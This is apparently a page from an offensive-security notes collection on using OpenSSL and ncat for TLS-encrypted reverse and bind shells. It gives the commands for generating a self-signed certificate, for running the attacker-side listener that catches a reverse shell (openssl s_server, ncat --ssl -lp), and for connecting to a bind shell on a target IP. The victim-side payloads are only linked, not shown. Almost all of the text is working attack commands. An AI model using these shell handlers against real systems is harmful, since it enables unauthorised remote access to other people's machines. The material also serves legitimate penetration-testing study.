# OpenSSL

## 01 - Reverse Shell

Generate TLS certificate.

```
userware@hackware-os:~$ openssl req -x509 -newkey rsa:4096 -days 365 -nodes -subj "/C=<country_code>/ST=<state>/L=<locality>/O=<organization_name>/OU=<organization_unit>/CN=<domain.com>/emailAddress=<email> -keyout private.key -out certificate.crt
```

Shell handler.

```
userware@hackware-os:~$ openssl s_server -quiet -key private.key -cert certificate.crt -port <PORT>

userware@hackware-os:~$ ncat --ssl --ssl-key private.key --ssl-cert certificate.crt -lp <PORT>
```

## 02 - Bind Shell

Shell handler

```
userware@hackware-os:~$ openssl s_client -quiet -connect <target_IP>:<target_PORT>

userware@hackware-os:~$ ncat --ssl <target_IP> <target_PORT>
```

---
## References

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Callback Shells/One-Liners/Linux/Reverse Shells/OpenSSL|OpenSSL: Reverse Shells]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Callback Shells/One-Liners/Linux/Bind Shells/OpenSSL|OpenSSL: Bind Shells]]